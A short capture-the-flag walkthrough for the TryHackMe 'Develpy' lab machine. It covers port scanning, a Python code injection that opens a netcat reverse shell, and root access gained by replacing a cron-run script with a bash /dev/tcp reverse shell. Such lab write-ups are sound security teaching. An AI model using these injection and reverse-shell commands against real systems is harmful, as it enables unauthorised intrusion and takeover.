# [Develpy](https://tryhackme.com/room/bsidesgtdevelpy)

## boot2root machine for FIT and bsides Guatemala CTF

# Develpy

## read user.txt and root.txt

### user.txt

1. First scan the ports to see what we can do

```Bash
nmap -p- <IP>
```

[SCREEN01]

2. Port 10000 is not your standard endpoint. So let's capture it with netcat

[SCREEN02]

```Bash
nc <IP> 10000
```

[SCREEN03]

3. This is a python script so let's set up another listener and reverse shell

```Bash
nc -lvnp 4444
```

```Python
__import__("os").system("nc -e /bin/sh 10.10.202.50 4444")
```

```Bash
whoami
python -c 'import pty; pty.spawn("/bin/bash")'
cat user.txt
```

[SCREEN04]

### root.txt

1. In our starting directory, there are two interesting files to examine: `run.sh` and `root.sh`

```Bash
ls -la
cat run.sh
cat root.sh
```

2. The `root.sh` file is being executed by a cron job with root privileges, but we have permission to delete it and replace it with our own reverse shell script

[SCREEN05]

```Bash
rm -f root.sh
echo 'bash -i >& /dev/tcp/10.10.202.50/5555 0>&1' > root.sh
chmod +x root.sh
```

3. Now set up a listener on our machine and wait for the cron job to execute our script

```Bash
nc -lvnp 5555
cat /root/root.txt
```

[SCREEN06]
